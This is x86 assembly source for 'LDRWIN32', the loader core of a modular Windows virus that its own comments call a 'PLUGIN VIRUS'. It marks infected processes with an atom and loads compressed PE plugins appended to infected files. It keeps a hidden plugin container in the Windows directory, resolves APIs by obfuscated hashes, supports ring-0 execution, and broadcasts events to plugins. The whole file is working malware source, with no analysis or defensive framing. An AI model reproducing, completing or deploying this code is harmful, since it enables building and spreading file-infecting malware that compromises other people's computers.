
include                 LDRWIN32.INC

include                 ..\..\INCLUDE\PGN2\pgn2.inc
include                 ..\..\INCLUDE\consts.inc
include                 ..\..\INCLUDE\seh.inc
include                 ..\..\INCLUDE\s2c.inc
include                 ..\..\INCLUDE\mz.inc
include                 ..\..\INCLUDE\pe.inc
include                 ..\..\INCLUDE\pe.inc

LT_INITIAL              equ     0
LT_COPY                 equ     1
LT_UPDATE               equ     2

                        public  ldrwin32_getinfo
                        public  ldrwin32_copy
                        public  ldrwin32_attach
                        public  ldrwin32_detach_me
                        public  PluginList
                        public  GetPluginList
                        public  Event
                        public  z_decode
                        public  uniquestr

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

PluginList              dd      ?
temp_ev                 dd      ?

x1:                     ; fake plugin for detaching
                        dd      0,0,0,0 ; pgn2_header
                        dd      0       ; 'DD 0' -- set terminator

                        .code

                        db      '[start]'       ; signature for HAXOR tool

; input: EAX=original EntryPointRVA

loader_start:
                        jmp     loader_entry    ; used by HOST.EXE only

include                 k32man.inc
include                 memory.inc
include                 ..\..\SYSTEM\Z_CODING\z_decode.inc

loader_entry:           pusha

;                       seh_init

                        push    'Vx1'      ; 3-byte asciiz
                        push    esp        ; ptr to atom name
                        callX   FindAtomA
                        pop     ecx        ; releaze asciiz
                        movzx   eax, ax    ; !!!
                        or      eax, eax
                        jnz     __quit     ; alredy found

                        push    'Vx1'
                        push    esp
                        callX   AddAtomA   ; local (per-process) atom
                        pop     ecx

  ; the following stuff executed ONCE per each infected process

                        push    EV_LDRWIN32_STARTUP
                        push    LT_INITIAL
                        call    ldrwin32_main
                        add     esp, 2*4
__quit:
;                       seh_done

                        popa
                        retn

ldrwin32_main           proc    c

                        arg     loadtype        ; LT_xxx
                        arg     startup_event

                        local   root
                        local   tempcount
                        local   filename:BYTE:260

                        pusha
                        cld

                        mov     [esp].popa_eax, 0        ; exit code

                        ; initialize plugin list

                        mov     root, 0

                        mov     eax, loadtype
                        dec     eax             ; LT_COPY
                        jz      __load_copy
                        dec     eax             ; LT_UPDATE
                        jz      __load_update

 ; build plugin tree

__load_initial:
 ; process external container

                        lea     edi, filename
                        call    mk_name

                        lea     edi, filename
                        push    0
                        push    FILE_ATTRIBUTE_NORMAL
                        push    OPEN_EXISTING
                        push    0
                        push    FILE_SHARE_READ
                        push    GENERIC_READ
                        push    edi
                        callX   CreateFileA

                        cmp     eax, -1
                        je      __skip0
                        xchg    ebx, eax

                        push    0
                        push    ebx
                        callX   GetFileSize
                        xchg    ecx, eax

                        call    malloc

                        pusha
                        push    0
                        lea     eax, [esp].pusha_eax+4
                        push    eax
                        push    ecx
                        push    edx
                        push    ebx
                        callX   ReadFile
                        popa
                        cmp     eax, 4
                        jb      __skip00

                        mov     esi, edx
                        call    load_plugin_list
__skip00:
                        call    mfree

                        push    ebx
                        callX   CloseHandle
__skip0:

 ; load plugins that follows loader

                        get_ofs esi, loader_end   ; temporary physical image
                        call    load_plugin_list

                        or      edx, edx          ; # of plugins loaded
                        jz      __skip_save
 ; update external container, in case this file has some new plugin
                        push    root
                        call    ldrwin32_save
                        add     esp, 4
__skip_save:

                        jmp     __load_complete

; make new copy of existing plugin tree

__load_copy:            mov     ebx, PluginList

__cycle4:               mov     esi, [ebx].list_phys
                        call    c_load_plugin

                        mov     ebx, [ebx].list_next
                        or      ebx, ebx
                        jnz     __cycle4

                        jmp     __load_complete

; update existing plugin tree

__load_update:          mov     eax, PluginList
                        mov     root, eax

                        jmp     __load_complete
__load_complete:

  ; process imports, for each module

                        mov     edi, root

                        ; no plugins at all? (what the fuck)
                        or      edi, edi
                        jz      __quit

                        ; clear UNRESOLVED flag
__cycle_pre2:           mov     ebx, [edi].list_virt    ; image base
                        or      ebx, ebx
                        jz      __cont_pre2
                        and     [ebx].pe_dynflags, not (FL_PGN2_UNRESOLVED)
__cont_pre2:            mov     edi, [edi].list_next
                        or      edi, edi
                        jnz     __cycle_pre2

                        ;;


__re2:                  mov     tempcount, 0

                        mov     edi, root

__cycle2:               mov     ebx, [edi].list_virt    ; image base
                        or      ebx, ebx
                        jz      __cont2

                        test    [ebx].pe_dynflags, FL_PGN2_UNRESOLVED+FL_PGN2_SEHERROR+FL_PGN2_DETACHED
                        jnz     __cont2

                        ; process module

                        mov     esi, [ebx].pe_importrva
                        or      esi, esi
                        jz      __cont2

                        add     esi, ebx

__cycle1:               cmp     dword ptr [esi+10h], 0  ; 10=addresstable
                        je      __exit1

                        mov     edx, [esi+0Ch]  ; 0C=name
                        add     edx, ebx
                        mov     al, [edx]       ; first char
                        call    find_module

                        cmp     edx, -1         ; r0
                        je      __dll
                        or      edx, edx        ; check if imagebase found
                        jz      __unresolved

                        cmp     al, '@'
                        jne     __dll
                        test    [edx].pe_dynflags, FL_PGN2_UNRESOLVED+FL_PGN2_SEHERROR+FL_PGN2_DETACHED
                        jnz     __unresolved
__dll:
                        xor     ecx, ecx

__cycle5:               mov     eax, [esi+0]    ; lookup
                        add     eax, ebx
                        mov     eax, [eax+ecx]  ; ptr to function name
                        or      eax, eax
                        jz      __exit5
                        lea     eax, [eax+ebx+2] ; skip WORD-hash

                        cmp     edx, -1         ; r0
                        jne     __havebase
                        lea     eax, r0_dllcall
                        jmp     __ins_addr
__havebase:
                        xchg    edx, ebx        ; req. imgbase in EBX
                        push    eax
                        push    0               ; undoc. feature ;-)
                        call    k32man_get_proc_address_ex
                        add     esp, 4          ; very undoc feature.  1/2 cdecl + 1/2 pascal 8-()
                        xchg    edx, ebx

                        or      eax, eax
                        jz      __unresolved

                        ; insert address
__ins_addr:
                        push    eax
                        mov     eax, [esi+10h]  ; 10=addresstable
                        add     eax, ebx
                        pop     dword ptr [eax+ecx]

                        add     ecx, 4
                        jmp     __cycle5
__exit5:
                        add     esi, 14h        ; imp. entry for next dll/pgn
                        jmp     __cycle1

__unresolved:           or      [ebx].pe_dynflags, FL_PGN2_UNRESOLVED
                        inc     tempcount

__exit1:
                        ; next module

__cont2:                mov     edi, [edi].list_next
                        or      edi, edi
                        jnz     __cycle2

                        ; until all "unresolved" plugins are marked
                        cmp     tempcount, 0
                        jne     __re2


  ; pre-find exported HandleEvent's and insert addresses
  ; into PE headers, to faster Event

                        mov     edi, root

__cycle0:               mov     ebx, [edi].list_virt     ; image base
                        or      ebx, ebx
                        jz      __cont0

;                       test    [ebx].pe_dynflags, FL_PGN2_UNRESOLVED
;                       jnz     __cont0

IFDEF   PGN2_FUCKAPI_NO
                        calchash HandleEvent
ENDIF
IFDEF   PGN2_FUCKAPI_YES
                        calchash VFYQBNIBKPM
ENDIF
IFDEF   PGN2_FUCKAPI_BADLY
;                       calchash Ó4ñ¡Ul•|
                        hash = 0A2D94A2Bh
ENDIF
                        push    hash
                        call    k32man_get_proc_address_ex
                        ; 0 is possible
                        mov     [ebx].pe_handleevent, eax ; HandleEvent addr

__cont0:                mov     edi, [edi].list_next
                        or      edi, edi
                        jnz     __cycle0

;                       push    0A0D2Ah
;                       push    esp
;                       callX   OutputDebugStringA
;                       add     esp,4

  ; insert special DWORDs

IFDEF   PGN2_FUCKAPI_NO
                        x_push  eax, @LDRWIN32.PGN~
ENDIF
IFDEF   PGN2_FUCKAPI_YES
                        x_push  eax, @SLGCLVQYNAWD~
ENDIF
IFDEF   PGN2_FUCKAPI_BADLY
;                       x_push  eax, @»s>rÔ§ð†Û#~
                        push    '#'
                        push    'Û†ð'
                        push    '§Ôr'
                        push    '>s»@'
                        _xsize = 16
ENDIF
                        mov     edx, esp
                        call    find_module     ; locate plugin
                        x_pop
                        or      edx, edx
                        jz      __error

                        mov     esi, edx        ; ESI = base of LDRWIN32

                        mov     ebx, esi

IFDEF   PGN2_FUCKAPI_NO
                        calchash PluginList
ENDIF
IFDEF   PGN2_FUCKAPI_YES
                        calchash IIJCYGAJLN
ENDIF
IFDEF   PGN2_FUCKAPI_BADLY
;                       calchash SS`îDar…
                        hash =  93381AD8h
ENDIF
                        push    hash
                        call    k32man_get_proc_address_ex
                        or      eax, eax
                        jz      __error
                        xchg    edi, eax
                        mov     eax, root
                        stosd


  ; call EntryPoints, for each module

                        mov     edi, root

__cycle3:               mov     ebx, [edi].list_virt
                        or      ebx, ebx
                        jz      __cont3

                        test    [ebx].pe_dynflags, FL_PGN2_UNRESOLVED + FL_PGN2_INITIALIZED+FL_PGN2_DETACHED
                        jnz     __cont3
                        or      [ebx].pe_dynflags, FL_PGN2_INITIALIZED

                        mov     eax, [ebx].pe_entrypointrva
                        or      eax, eax
                        jz      __cont3
                        add     eax, ebx

                        push    dword ptr [ebx].pe_unloadcode
                        call    eax
                        add     esp, 4

__cont3:                mov     edi, [edi].list_next
                        or      edi, edi
                        jnz     __cycle3

  ; call initial Event
                        mov     ebx, esi        ; ESI = base of LDRWIN32
IFDEF   PGN2_FUCKAPI_NO
                        calchash Event
ENDIF
IFDEF   PGN2_FUCKAPI_YES
                        calchash ASWFN
ENDIF
IFDEF   PGN2_FUCKAPI_BADLY
;                       calchash »Ú7†
                        hash = 97569B06h
ENDIF
                        push    hash
                        call    k32man_get_proc_address_ex
                        or      eax, eax
                        jz      __error

                        push    0
                        push    startup_event
                        call    eax                      ; Event
                        add     esp, 8

                        mov     [esp].popa_eax, eax      ; exit code

  ;;;
                        cmp     loadtype, LT_UPDATE
                        je      __quit

                        ; if exitcode == 0 -- nobody handled our request,
                        ;                     so, uninstall virus in memory
                        or      eax, eax
                        jnz     __quit

  ; uninstall -- call unload()

                        mov     edi, root

__freecycle_u:          mov     edx, [edi].list_virt
                        or      edx, edx
                        jz      __skipfree_u
                        mov     eax, UT_UNINSTALL
                        call    try_unload
__skipfree_u:
                        mov     edi, [edi].list_next
                        or      edi, edi
                        jnz     __freecycle_u

  ; uninstall -- free allocated memory

                        mov     edi, root

__freecycle:            mov     edx, [edi].list_phys
                        call    mfree
                        mov     edx, [edi].list_virt    ; m.b. NULL
                        call    mfree

                        mov     esi, [edi].list_next

                        mov     edx, edi
                        call    mfree

                        mov     edi, esi
                        or      edi, edi
                        jnz     __freecycle

__quit:
                        popa
                        ret

__error:                int 3
                        jmp     __quit

mk_name:                pusha

                        push    260
                        push    edi
                        callX   GetWindowsDirectoryA
                        add     edi, eax

                        mov     al, '\'
                        stosb

                        push    0A85CF86Dh      ; crc32('ldrwin32')
                        push    8
                        push    edi
                        call    uniquestr
                        add     esp, 3*4

                        mov     byte ptr [eax], 0

                        popa
                        retn

; input:  ESI=packed plugin(s), terminating DD 0
; output: EDX=# of plugins loaded

load_plugin_list:
                        xor     edx, edx

__cycle:                mov     ecx, [esi].dword ptr 0
                        jecxz   __done

                        call    c_load_plugin

                        add     edx, eax

                        add     esi, [esi].pgn2_compressed
                        add     esi, size pgn2_header
                        jmp     __cycle

__done:                 retn

; input:  EDX=asciiz module name, '@'-prefixed .PGNs
; output: EDX=DLL or PGN base virtual address or 0 or -1

find_module:            pusha

                        cmp     byte ptr [edx], '@'
                        jne     __@loadlib
                        inc     edx

                        ; scan all plugins for name match

                        mov     edi, root
__@cycle:
                        mov     ebx, [edi].list_virt
                        or      ebx, ebx
                        jz      __@cont

                        mov     ecx, [ebx].pe_exportrva
                        jecxz   __@cont
                        add     ecx, ebx

                        mov     ecx, [ecx+0Ch]  ; exports: DLL name
                        add     ecx, ebx

                        xor     esi, esi
                        dec     esi
__@cmp:                 inc     esi
                        mov     al, [ecx+esi]
                        or      al, al
                        je      __@found
;                       cmp     al, '.'       ; extension is now significant
;                       je      __@found
                        xor     al, [edx+esi]
                        and     al, not 20h   ; case insensitive
                        jz      __@cmp

__@cont:                mov     edi, [edi].list_next
                        or      edi, edi
                        jnz     __@cycle

                        ; plugin not found
                        xor     ebx, ebx
                        jmp     __@found

                        ; cant loadlib in r0 ?...
__@loadlib:             mov     eax, cs
                        cmp     eax, 28h
                        mov     ebx, -1
                        je      __@found

                        push    edx
                        callX   LoadLibraryA
                        xchg    ebx, eax

__@found:               mov     [esp].popa_edx, ebx

                        popa
                        retn

c_load_plugin:          push    esi
                        lea     eax, root
                        push    eax
                        call    load_plugin
                        add     esp, 2*4
                        retn

ldrwin32_main           endp

load_plugin             proc    c
                        arg     root_ptr
                        arg     plugin_ptr
                        local   unloadcode
                        pusha
                        cld

                        mov     [esp].popa_eax, 0
                        mov     unloadcode, 0

                        mov     esi, plugin_ptr

                        ; check if plugin with same ID alredy exists

                        mov     edi, root_ptr
                        mov     ebx, [edi]
                        or      ebx, ebx
                        jz      __skip0
__cycle0:
                        mov     ecx, [ebx].list_phys

                        mov     eax, [ecx].pgn2_id
                        cmp     eax, [esi].pgn2_id
                        jne     __cont0

                        mov     eax, [ecx].pgn2_version
                        cmp     eax, [esi].pgn2_version
                        jae     __exit   ; alredy have newer or same

                        ; delete old entry

                        mov     edx, [ebx].list_phys
                        mov     ecx, [edx].pgn2_id
                        call    mfree

                        mov     edx, [ebx].list_virt
                        or      edx, edx
                        jz      __skip_freevirt

                        mov     eax, UT_UPDATE
                        call    try_unload
                        mov     unloadcode, eax  ; store exitcode

  ; skip mfree() if updating ldrwin32
                        cmp     ecx, 0A85CF86Dh ; ID == crc32('ldrwin32')
                        jne     __cont1
                        test    [edx].pe_dynflags, FL_PGN2_INITIALIZED
                        jnz     __skip_freevirt
__cont1:

  ; skip mfree() if it will skip current at-eip bytes;
  ; this will cause little memory leak, when updating ldrwin32 / attacher
                        mov     eax, 12345678h
ret_addr                equ     dword ptr $-4
                        sub     eax, edx
                        cmp     eax, [edx].pe_imagesize
                        jb      __skip_freevirt

  ; skip if detach_me() in process, same reason as at-eip bytes
                        test    [edx].pe_dynflags, FL_PGN2_DETACHED
                        jnz     __skip_freevirt

                        call    mfree
__skip_freevirt:
                        jmp     __skip9

__cont0:                lea     edi, [ebx].list_next
                        mov     ebx, [edi]
                        or      ebx, ebx
                        jnz     __cycle0
__skip0:
                        ; allocate new list entry
                        mov     ecx, size list_entry
                        call    malloc
                        mov     ebx, edx

                        ; add entry into list (last in, first in list)
                        mov     ecx, root_ptr
                        mov     eax, [ecx]
                        mov     [ecx], ebx
                        mov     [ebx].list_next, eax
__skip9:
                        ; allocate space for physical image
                        mov     ecx, [esi].pgn2_compressed
                        add     ecx, size pgn2_header  ; +header
                        call    malloc

                        ; store physical location
                        mov     [ebx].list_phys, edx

                        ; copy physical image
                        mov     edi, edx
                        rep     movsb

                        ; esi = new physical copy
                        mov     esi, edx

                        ; allocate temporary buffer
                        mov     ecx, [esi].pgn2_decompressed
                        jecxz   __load_complete  ; empty plugin, detached
                        call    malloc

                        ; decompress, [EDI] <-- [ESI]
                        add     esi, 8        ; skip additional header,
                        mov     edi, edx      ;   DD crc-id, DD ver
                        call    z_decode_asm

                        ; esi = decompressed PE, in physical form
                        ;; ***FIXED*** {
                        mov     esi, edx                ; used as signature
                        cmp     [esi].pe_id, '2NGP'     ; for IFSHAN/KILLEM
                        ;; } ***FIXED***
                        jne     __fuck
                        cmp     [esi].pe_pgnsubver, 1
                        jne     __fuck

                        ; allocate space for virtual image
                        mov     ecx, [esi].pe_imagesize
                        call    malloc

                        ; store virtual location
                        mov     [ebx].list_virt, edx

                        ; load PE, [EDI] <-- [ESI]
                        mov     edi, edx
                        call    peldr

                        mov     eax, unloadcode
                        mov     [edi].pe_unloadcode, eax

                        ; free temporary buffer
                        mov     edx, esi
                        call    mfree
__load_complete:
                        mov     [esp].popa_eax, 1

__exit:                 popa
                        ret

__fuck:                 call    mfree
                        mov     edx, [ebx].list_phys
                        call    mfree

                        mov     eax, [ebx].list_next
                        mov     ecx, root_ptr
                        mov     [ecx], eax

                        mov     edx, ebx
                        call    mfree

                        jmp     __exit

try_unload:             pusha
                        xor     eax, eax
                        test    [edx].pe_dynflags, FL_PGN2_INITIALIZED
                        jz      __skip_unload
                        mov     ebx, edx
IFDEF   PGN2_FUCKAPI_NO
                        calchash unload
ENDIF
IFDEF   PGN2_FUCKAPI_YES
                        calchash GWZMJM
ENDIF
IFDEF   PGN2_FUCKAPI_BADLY
;                       calchash BÞø}^
                        hash = 0FF1F6D62h
ENDIF
                        push    hash
                        call    k32man_get_proc_address_ex
                        or      eax, eax
                        jz      __skip_unload

                        push    [esp].pusha_eax  ; why
                        call    eax        ; int __cdecl unload(int UT_xxx)
                        add     esp,4

__skip_unload:          mov     [esp].popa_eax, eax
                        popa
                        retn

; input:  ESI=ptr to physical plugin image (PGN2-format)
;         EDI=ptr to virtual address to load plugin to
; action: 1. plugin header & sections copied
;         2. fixups applied

peldr:                  pusha

                        ; copy PE header
                        pusha
                        mov     ecx, [esi+0F8h].oe_physoffs ; F8==PE hdr size
                        rep     movsb
                        popa

                        mov     [edi].pe_dynflags, 0    ; zerofill flags
                        mov     [edi].pe_imagebase, edi

                        ; load sections

                        movzx   ecx, [esi].pe_numofobjects
                        lea     ebx, [esi+0F8h]
__cycle1:
                        ; copy section
                        pusha
                        add     esi, [ebx].oe_physoffs
                        add     edi, [ebx].oe_virtrva
                        mov     ecx, [ebx].oe_physsize
                        rep     movsb
                        popa

                        add     ebx, 28h
                        loop    __cycle1

                        ; process fixups

                        mov     ebx, [esi].pe_fixuprva
                        or      ebx, ebx
                        jz      __nofixups
                        add     ebx, edi

                        mov     ebp, [esi].pe_fixupsize

__cycle3:               mov     ecx, [ebx+4]            ; blocksize
                        sub     ecx, 8                  ; -header_size
                        shr     ecx, 1
                        jecxz   __suck2

                        lea     edx, [ebx+8]

__cycle2:               mov     eax, [edx]              ; fixup entry (WORD)
                        and     eax, 0FFFh              ; page offs
                        add     eax, [ebx+0]            ; +base rva

                        add     [edi+eax], edi          ; apply fixup

                        inc     edx
                        inc     edx
                        loop    __cycle2
__suck2:
                        mov     eax, [ebx+4]            ; blocksize
                        add     ebx, eax

                        sub     ebp, eax
                        jg      __cycle3
__nofixups:
                        ; complete

                        popa
                        retn

load_plugin             endp

ldrwin32_save           proc    c
                        arg     root
                        local   filename:BYTE:260
                        pusha
                        cld

                        lea     edi, filename
                        call    mk_name

                        lea     edi, filename
                        push    0
                        push    FILE_ATTRIBUTE_NORMAL
                        push    CREATE_ALWAYS
                        push    0
                        push    0  ; no shares when updating
                        push    GENERIC_READ + GENERIC_WRITE
                        push    edi
                        callX   CreateFileA

                        cmp     eax, -1
                        je      __exit
                        xchg    ebx, eax

                        mov     esi, root
__cycle:
                        mov     edx, [esi].list_phys
                        mov     ecx, [edx].pgn2_compressed
                        add     ecx, size pgn2_header

                        call    __writefile

                        mov     esi, [esi].list_next
                        or      esi, esi
                        jnz     __cycle

                        lea     edx, filename
                        mov     [edx], esi    ; terminating DD 0
                        mov     ecx, 4
                        call    __writefile

                        push    ebx
                        callX   CloseHandle

__exit:                 popa
                        ret

__writefile:            pusha
                        push    0
                        lea     eax, [esp].pusha_eax+4
                        push    eax
                        push    ecx
                        push    edx
                        push    ebx
                        callX   WriteFile
                        popa
                        retn

                        endp

include                 unique.inc

loader_end:
loader_size             equ     loader_end-loader_start

                        db      '[end]'         ; signature for HAXOR tool

ldrwin32_getinfo:       lea     eax, ldrwin32_info
                        retn

ldrwin32_info:          dd      loader_start
                        dd      loader_size
                        dd      loader_entry - loader_start

GetPluginList:          mov     eax, PluginList
                        retn

ldrwin32_copy:          push    dword ptr [esp+4]       ; event
                        push    LT_COPY
                        call    ldrwin32_main
                        add     esp, 2*4
                        retn

ldrwin32_attach:        mov     temp_ev, EV_LDRWIN32_ATTACHED
ldrwin32_attach_ex:
                        ; used to avoid "attach attacher" problem
                        mov     eax, [esp]
                        mov     ret_addr, eax

                        xor     ecx, ecx                ; #
                        mov     edx, [esp+4]            ; plugin_ptr

__cycle:                mov     eax, [esp+4]    ; buf
                        add     eax, [esp+8]    ; +bufsize
                        sub     eax, size pgn2_header + MIN_PLUGIN_SIZE
                        cmp     edx, eax
                        jae     __done

                        cmp     dword ptr [edx], 0      ; terminator?
                        je      __done

                        ; out of range?
                        push    ecx
                        mov     ecx, [edx].pgn2_compressed
                        add     ecx, size pgn2_header
                        add     ecx, [esp+4]+4   ; +buf offs
                        cmp     ecx, eax
                        pop     ecx
                        jae     __done

                        push    edx                     ; plugin_ptr
                        push    offset PluginList       ; @root
                        call    load_plugin
                        add     esp, 2*4

                        add     ecx, eax

                        add     edx, [edx].pgn2_compressed
                        add     edx, size pgn2_header
                        jmp     __cycle
__done:
                        push    ecx
                        jecxz   __quit

                        ; update external container
                        push    PluginList
                        call    ldrwin32_save
                        add     esp, 4

                        ; re-init imports
                        push    temp_ev
                        push    LT_UPDATE
                        call    ldrwin32_main
                        add     esp, 2*4

__quit:                 pop     eax

                        mov     ret_addr, 0

                        retn

ldrwin32_detach_me:     pusha

                        mov     eax, [esp+32]              ; return address
                        call    find_by_addr
                        jnc     __exit

                        or      [ebx].pe_dynflags, FL_PGN2_DETACHED

                        mov     eax, [edx].list_phys
                        mov     ecx, [eax].pgn2_id
                        mov     x1.pgn2_id, ecx
                        mov     ecx, [eax].pgn2_version
                        inc     ecx
                        mov     x1.pgn2_version, ecx
                        ; pgn2_compressed/pgn2_decompressed = 0

                        push    1024    ; to avoid min-size-limit check
                        push    offset x1
                        mov     temp_ev, EV_LDRWIN32_DETACHED
                        call    ldrwin32_attach_ex
                        add     esp, 8

__exit:                 popa
                        retn

; ---------------------------------------------------------------------------

; main HandleEvent of the whole PLUGIN VIRUS.
; action: broadcast incoming events to all plugins

Event:
                        xor     eax, eax        ; return value

                        xor     ecx, ecx        ; for priority = 0..10

__cycle1:               ; for each plugin

                        mov     edx, PluginList ; EDX = pluginlist root

__cycle2:               pusha

                        mov     eax, [edx].list_virt    ; imagebase
                        or      eax, eax
                        jz      __next

                        ; have unresolved imports & etc?
                        test    [eax].pe_dynflags, FL_PGN2_UNRESOLVED+FL_PGN2_SEHERROR+FL_PGN2_DETACHED
                        jnz     __next

                        cmp     [eax].pe_priority, ecx
                        jne     __next

                        mov     eax, [eax].pe_handleevent  ; HandleEvent addr
                        or      eax, eax        ; (search for it now is sux,
                        jz      __next          ;  so, it is pre-calculated)

                        mov     edx, [esp+32+8]    ; user param
                        mov     ecx, [esp+32+4]    ; event id

                        push    eax
                        mov     eax, cs
                        cmp     eax, 28h
                        pop     eax
                        je      __skip1

                        call    __seh_init
                        int 3
                        mov     eax, [esp+4]    ; exception_record*
                        mov     esp, [esp+8]
                        stc
                        jmp     __seh_error
__seh_init:             push    dword ptr fs:[0]
                        mov     fs:[0], esp
__skip1:

                        push    edx             ; user param
                        push    ecx             ; event id
                        call    eax             ; call plugin's HandleEvent
                        add     esp, 8

                        mov     ecx, cs
                        cmp     ecx, 28h
                        je      __skip2

                        clc
__seh_error:            pop     dword ptr fs:[0]
                        lea     esp, [esp+4]
                        jnc     __skip2

                        mov     eax, [eax+0Ch]   ; error EIP

                        call    find_by_addr

                        jnc     __skip_disable
                        or      [ebx].pe_dynflags, FL_PGN2_SEHERROR
__skip_disable:
                        pusha
                        push    EV_LDRWIN32_SEHERROR
                        push    LT_UPDATE
                        call    ldrwin32_main
                        add     esp, 2*4
                        popa

                        xor     eax, eax ; set failed event return code to 0
__skip2:
                        cmp     eax, -1
                        jle     __mov
                        add     eax, [esp].popa_eax     ; 0/1
__mov:                  mov     [esp].popa_eax, eax     ; 0/1/-1

__next:                 popa

                        cmp     eax, -1         ; -1=stop broadcasting
                        je      __exit

                        mov     edx, [edx].list_next    ; next entry
                        or      edx, edx
                        jnz     __cycle2

                        inc     ecx
                        cmp     ecx, 10
                        jbe     __cycle1        ; including 10

__exit:                 retn                            ; complete

; ---------------------------------------------------------------------------

; input:  EAX=addr
; modify: EDX,EBX,ECX
; output: CF=1 EDX=list_entry   EBX=virtbase
;         CF=0 EDX=0
find_by_addr:           mov     edx, PluginList
__find:                 mov     ebx, [edx].list_virt
                        or      ebx, ebx
                        jz      __cont
                        mov     ecx, eax
                        sub     ecx, ebx
                        cmp     ecx, [ebx].pe_imagesize
                        jb      __found
__cont:                 mov     edx, [edx].list_next
                        or      edx, edx
                        jnz     __find
__found:                retn

; ---------------------------------------------------------------------------

; address of this subroutine is inserted into import table
; instead of addresses of all ring-3 DLL API's
; when we're running in ring-0

r0_dllcall:             int 3
                        jmp     $

; ---------------------------------------------------------------------------

                        end
